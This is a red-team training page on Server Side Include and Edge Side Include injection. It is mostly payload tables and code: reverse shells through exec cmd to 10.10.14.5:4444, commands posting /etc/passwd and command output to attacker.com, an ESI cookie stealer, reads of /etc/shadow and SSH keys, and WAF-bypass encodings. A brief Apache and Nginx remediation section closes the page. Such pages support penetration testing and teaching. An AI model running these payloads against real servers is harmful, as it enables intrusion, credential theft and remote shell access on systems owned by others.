---
layout: training-page
title: "Server Side Include Injection — Red Team Academy"
module: "Web Hacking"
tags:
  - ssi
  - esi
  - server-side-include
  - rce
  - web
page_key: "web-ssi-injection"
render_with_liquid: false
---

# Server Side Include Injection

Server Side Includes (SSI) are directives embedded in HTML pages and processed by the web server before the page is sent to the client. They can include files, execute commands, and print environment variables. SSI Injection occurs when unsanitized user input reaches an SSI context, allowing an attacker to execute arbitrary commands on the server.

## SSI Directive Format

```
<!--#directive param="value" -->
```

SSI is commonly enabled on Apache and IIS for files with `.shtml`, `.shtm`, or `.stm` extensions, though some configurations apply it to all `.html` files.

## SSI Injection Payloads

| Description | Payload |
| --- | --- |
| Print the date | `<!--#echo var="DATE_LOCAL" -->` |
| Print the document name | `<!--#echo var="DOCUMENT_NAME" -->` |
| Print all environment variables | `<!--#printenv -->` |
| Set a variable | `<!--#set var="name" value="Rich" -->` |
| Include a file | `<!--#include file="/etc/passwd" -->` |
| Include a virtual path | `<!--#include virtual="/index.html" -->` |
| Execute a command | `<!--#exec cmd="ls" -->` |
| Reverse shell | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## Detection and Exploitation with SSTImap

SSTImap detects and exploits SSTI and SSI injection with its `--legacy` flag or `-e SSI` engine selector:

```
# Basic detection via GET parameter
python3 ./sstimap.py -u 'https://example.com/page?name=John' --legacy -s

# Interactive mode targeting a vulnerable parameter with SSI engine
python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e SSI

# POST request with basic auth
python3 ./sstimap.py -i --legacy -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```

## Edge Side Inclusion (ESI) Injection

Edge Side Includes (ESI) are an XML-based markup language used by HTTP caching proxies (Varnish, Squid, Fastly, Akamai) to assemble web pages from multiple fragments. Caching surrogates cannot distinguish legitimate ESI tags from attacker-injected ones in the HTTP response body, making them a powerful injection vector.

Some surrogates require ESI to be enabled via the response header:

```
Surrogate-Control: content="ESI/1.0"
```

### ESI Injection Payloads

| Description | Payload |
| --- | --- |
| Blind detection (SSRF) | `<esi:include src=http://attacker.com>` |
| XSS via remote include | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie stealer | `<esi:include src=http://attacker.com/steal.php?c=$(HTTP_COOKIE)>` |
| Include local file | `<esi:include src="supersecret.txt">` |
| Display debug info | `<esi:debug/>` |
| Add redirect header | `<!--esi $add_header('Location','http://attacker.com') -->` |
| Inline XSS fragment | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

### ESI Feature Support by Surrogate

| Software | Includes | Vars | Cookies | Upstream Header Required | Host Whitelist |
| --- | --- | --- | --- | --- | --- |
| Squid3 | Yes | Yes | Yes | Yes | No |
| Varnish Cache | Yes | No | No | Yes | Yes |
| Fastly | Yes | No | No | No | Yes |
| Akamai ESI Test Server | Yes | Yes | Yes | No | No |
| Node.js esi | Yes | Yes | Yes | No | No |
| Node.js nodesi | Yes | No | No | No | Optional |

---

## Detecting SSI-Enabled Pages

### File Extension Fingerprinting

The most reliable indicator is the file extension. SSI is typically processed only for files matching the server's AddType or XBitHack configuration:

```
.shtml    # Primary SSI extension on Apache/Nginx
.shtm     # Alternate SSI extension
.stm      # Used on some IIS configurations
.html     # If XBitHack is enabled or Options +Includes applies to *.html
```

When crawling, note pages with these extensions. A `.shtml` page that accepts user input in a visible or hidden parameter is worth probing.

### Server Response Headers

Apache with SSI enabled often reveals itself in the `Server` header or via the `Vary` header when caching:

```
Server: Apache/2.4.54 (Unix)
# If mod_include is loaded, SSI is potentially active
```

Use curl to inspect headers quickly:

```
curl -I https://target.com/page.shtml
```

Look for mod_include in Apache's module listing if you have access to `/server-info` (which is itself a misconfiguration):

```
curl https://target.com/server-info | grep mod_include
```

### Error Response Fingerprinting

Inject a malformed SSI directive and observe the response. Apache with SSI enabled will produce a distinct error pattern rather than ignoring the payload:

```
<!--#invalid_directive -->
<!--#exec cmd="" -->
```

If the server processes the page through mod_include, malformed directives result in a `[an error occurred while processing this directive]` string in the response.

### Passive Detection via Burp Suite

Configure Burp to flag `.shtml`/`.stm` URLs automatically during passive scanning. In Burp's Passive Scanner settings, you can write a custom Bambda rule or use the existing "Server-Side Include injection" check in Burp Professional.

---

## Full SSI Payload Reference (Apache / Nginx)

### <!--#echo--> — Print Variables

Print any CGI/SSI environment variable:

```
<!--#echo var="DATE_LOCAL" -->
<!--#echo var="DATE_GMT" -->
<!--#echo var="DOCUMENT_NAME" -->
<!--#echo var="DOCUMENT_URI" -->
<!--#echo var="LAST_MODIFIED" -->
<!--#echo var="SERVER_NAME" -->
<!--#echo var="SERVER_SOFTWARE" -->
<!--#echo var="REMOTE_ADDR" -->
<!--#echo var="REMOTE_HOST" -->
<!--#echo var="HTTP_USER_AGENT" -->
<!--#echo var="HTTP_COOKIE" -->
<!--#echo var="QUERY_STRING" -->
<!--#echo var="REQUEST_METHOD" -->
```

### <!--#printenv--> — Dump All Variables

```
<!--#printenv -->
```

Dumps the complete environment including `HTTP_*` request headers, server variables, and any custom variables set by the application.

### <!--#set--> — Define Variables

```
<!--#set var="myvar" value="test" -->
<!--#echo var="myvar" -->
```

### <!--#include--> — Local File Inclusion

```
<!--#include file="../../etc/passwd" -->
<!--#include file="/etc/shadow" -->
<!--#include virtual="/WEB-INF/web.xml" -->
<!--#include virtual="/admin/config.php" -->
```

The `file` parameter is relative to the document. The `virtual` parameter is relative to the document root. Both can be used for LFI depending on server configuration.

### <!--#exec--> — Remote Code Execution

`exec cmd` runs the command through `/bin/sh`:

```
<!--#exec cmd="id" -->
<!--#exec cmd="whoami" -->
<!--#exec cmd="cat /etc/passwd" -->
<!--#exec cmd="ls -la /var/www/html" -->
<!--#exec cmd="uname -a" -->
<!--#exec cmd="ifconfig" -->
```

`exec cgi` runs a CGI script located in a cgi-bin directory:

```
<!--#exec cgi="/cgi-bin/reverse.sh" -->
```

Reverse shell payloads via exec cmd:

```
<!--#exec cmd="bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" -->
<!--#exec cmd="mkfifo /tmp/f;nc 10.10.14.5 4444 0</tmp/f|/bin/bash 1>/tmp/f;rm /tmp/f" -->
<!--#exec cmd="python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"10.10.14.5\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'" -->
```

---

## Blind SSI — Side-Channel Detection

When the server processes SSI directives but does not return the output to the client (e.g., the parameter is logged but never reflected), use out-of-band techniques.

### DNS Callback

Use exec to trigger a DNS lookup to your collaborator server:

```
<!--#exec cmd="nslookup $(id).attacker.burpcollaborator.net" -->
<!--#exec cmd="curl http://$(whoami).attacker.oastify.com/" -->
```

The subdomain in the DNS lookup contains the command output, visible in your DNS log.

### HTTP Callback with Command Output

```
<!--#exec cmd="curl -d @/etc/passwd http://attacker.com/collect" -->
<!--#exec cmd="wget -q -O- http://attacker.com/$(id|base64)" -->
```

### Time Delay

If DNS/HTTP callbacks are blocked, use a sleep to confirm blind execution:

```
<!--#exec cmd="sleep 10" -->
```

Measure the response time. A 10-second delay confirms the directive was executed even without output.

---

## SSI to LFI and RFI via <!--#include-->

### Local File Inclusion

Read sensitive files using path traversal:

```
<!--#include file="../../../../etc/passwd" -->
<!--#include file="../../../../etc/shadow" -->
<!--#include file="../../../../home/user/.ssh/id_rsa" -->
<!--#include file="../../../../var/log/apache2/access.log" -->
```

### Remote File Inclusion

If `SSILegacyExprParser` is on or the server allows remote includes via virtual:

```
<!--#include virtual="http://attacker.com/malicious.shtml" -->
```

Not supported in modern Apache by default, but older or misconfigured servers may allow it.

---

## WAF Bypass Techniques

### Null Byte Insertion

Some WAFs match the literal `<!--#exec` pattern. Insert null bytes to break the pattern match:

```
<!--#e%00xec cmd="id" -->
<!--#exec%00 cmd="id" -->
```

### Case Variation

SSI directives are case-insensitive in some server implementations:

```
<!--#EXEC cmd="id" -->
<!--#Exec CMD="id" -->
```

### Whitespace Variants

```
<!--#exec  cmd="id" -->
<!--# exec cmd="id" -->
<!--#exec	cmd="id" -->
```

### Encoding

URL-encode critical characters when the injection point is a query parameter:

```
%3C%21--%23exec%20cmd%3D%22id%22%20--%3E
```

Double-encode for WAFs that decode once before inspecting:

```
%253C%2521--%2523exec%2520cmd%253D%2522id%2522%2520--%253E
```

---

## Burp Suite Detection Methodology

1. Spider or manually browse to identify `.shtml`, `.shtm`, `.stm` pages.
2. For each parameter on those pages, send to Repeater.
3. Insert the canary payload: `<!--#echo var="DOCUMENT_NAME" -->`. If the response contains the filename of the current document, SSI is confirmed.
4. Escalate with `<!--#printenv -->` to dump all variables.
5. If exec is permitted, run `<!--#exec cmd="id" -->` to confirm command execution.
6. For blind SSI, use Burp Collaborator payload in the exec cmd.

---

## Remediation — Server Configuration Context

In Apache, SSI is controlled by `mod_include` and `Options Includes` in the virtualhost or directory config:

```apache
# Disable SSI entirely (recommended)
Options -Includes

# If SSI is required, disable exec specifically
Options +IncludesNOEXEC

# Limit SSI to specific directories only
<Directory "/var/www/html/ssi-content">
    Options +Includes
</Directory>
```

In Nginx, SSI is controlled by the `ssi` directive:

```nginx
# Disable SSI (default)
ssi off;

# If enabled, restrict to specific locations
location /ssi-content/ {
    ssi on;
}
```

Always validate and sanitize user input before it reaches any file that the server parses for SSI directives.

---

## Tools

- [vladko312/SSTImap](https://github.com/vladko312/SSTImap) — Automatic SSTI/SSI detection and exploitation tool

## Resources

- Beyond XSS: Edge Side Include Injection — Louis Dion-Marcil — `gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection`
- ESI Injection Part 2: Abusing Specific Implementations — Philippe Arteau — `gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations`
- Exploiting Server Side Include Injection — n00py — `n00py.io/2017/08/exploiting-server-side-include-injection/`
- Server-Side Includes (SSI) Injection — OWASP — `owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection`
- DEF CON 26 — Edge Side Include Injection Abusing Caching Servers into SSRF — ldionmarcil
- Apache mod_include Documentation — `httpd.apache.org/docs/current/mod/mod_include.html`
- HackTricks SSI Injection — `book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection`
